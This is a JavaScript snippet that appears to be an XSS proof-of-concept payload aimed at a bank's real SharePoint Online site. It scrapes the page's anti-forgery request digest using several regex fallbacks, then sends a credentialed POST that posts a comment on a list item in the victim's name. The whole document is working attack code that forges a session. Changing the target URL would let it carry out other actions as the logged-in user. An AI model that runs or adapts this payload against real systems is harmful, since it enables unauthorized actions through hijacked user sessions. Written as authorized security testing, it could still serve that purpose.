(function() {
    const DIGEST_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/Lists/TestXSS/AllItems.aspx';
    const ACTION_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';
    const COMMENT_BODY = '{"text":"[Bình luận tự động đã được chèn thành công!]","mentions":[]}';
    
    function executePost(digestValue) {
        if (!digestValue) {
            return;
        }

        var xhr = new XMLHttpRequest();
        xhr.open('POST', ACTION_URL, true);
        xhr.withCredentials = true;
        
        xhr.setRequestHeader('X-Requestdigest', digestValue);
        xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
        xhr.setRequestHeader('Accept', 'application/json;odata=verbose'); 
        
        xhr.onload = function() { console.log('✅ Comment Sent - Status:', xhr.status, xhr.responseText); };
        xhr.onerror = function() { console.error('❌ Error sending comment.'); };

        xhr.send(COMMENT_BODY);
    }

    function handleDigestResponse() {
        let digestValue = null;
        const responseText = this.responseText;

        const regexSPO = /"_SPOFormDigestValue":"([^"]+)"/i;
        let match = responseText.match(regexSPO);
        
        if (match && match[1]) {
            digestValue = match[1];
        }

        if (!digestValue) {
            const regexOld = /"FormDigestValue":"([^"]+)"/i;
            match = responseText.match(regexOld);
            if (match && match[1]) {
                digestValue = match[1];
            }
        }
        
        if (!digestValue) {
            const regexHTML = /id=["']__REQUESTDIGEST["'][^>]*?value=["']([^"']+)["']/i;
            match = responseText.match(regexHTML);
            if (match && match[1]) {
                digestValue = match[1];
            }
        }
        
        executePost(digestValue);
    }

    function getDigestAndRun() {
        const digestReq = new XMLHttpRequest();
        digestReq.onload = handleDigestResponse;
        digestReq.onerror = function(){ 
            console.error('❌ Error fetching digest URL. Check CORS or network.'); 
        };

        digestReq.open('get', DIGEST_URL, true); 
        digestReq.setRequestHeader('Accept', 'application/json;odata=verbose'); 
        digestReq.send();
    }

    setTimeout(() => { 
        try { 
            getDigestAndRun(); 
        } catch(e) { 
            console.error('Initial execution error:', e); 
        } 
    }, 50);
})();
